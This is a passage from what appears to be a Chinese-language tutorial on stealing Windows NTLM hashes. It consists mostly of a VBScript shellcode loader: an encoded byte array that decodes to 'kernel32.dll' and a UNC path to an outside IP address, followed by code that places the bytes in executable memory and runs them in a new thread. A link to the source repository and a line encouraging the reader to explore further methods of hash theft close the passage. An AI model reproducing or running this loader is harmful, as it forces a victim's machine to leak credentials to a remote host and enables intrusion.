&amp;H9c, &amp;H33, &amp;Hc0, &amp;H5f, &amp;H5e, &amp;H5b, &amp;Hc9, &amp;Hc3, &amp;H8b, &amp;H4d, &amp;Hfc, &amp;H8b, &amp;H44, &amp;H33, &amp;H24, &amp;H8d, &amp;H04, &amp;H48, &amp;H0f, &amp;Hb7, _
&amp;H0c, &amp;H30, &amp;H8b, &amp;H44, &amp;H33, &amp;H1c, &amp;H8d, &amp;H04, &amp;H88, &amp;H8b, &amp;H04, &amp;H30, &amp;H03, &amp;Hc6, &amp;Heb, &amp;Hdf, &amp;H21, &amp;H05, &amp;H05, &amp;H05, _
&amp;H50, &amp;H05, &amp;H05, &amp;H05, &amp;H6b, &amp;H65, &amp;H72, &amp;H6e, &amp;H65, &amp;H6c, &amp;H33, &amp;H32, &amp;H2e, &amp;H64, &amp;H6c, &amp;H6c, &amp;H05, &amp;H2f, &amp;H2f, &amp;H33, _
&amp;H35, &amp;H2e, &amp;H31, &amp;H36, &amp;H34, &amp;H2e, &amp;H31, &amp;H35, &amp;H33, &amp;H2e, &amp;H32, &amp;H32, &amp;H34, &amp;H2f, &amp;H61, &amp;H61, &amp;H05)
scLocation = DX.VirtualAlloc(0, UBound(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
For i =LBound(shellcode) to UBound(shellcode)
DX.NumPut shellcode(i),scLocation,i
Next
thread = DX.CreateThread (0,0,scLocation,0,0)
```

[https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vbs](https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vbs) 

在Windows系统中，可能还存在很多种窃取NTLM HASH的方法，你可以断续探索。
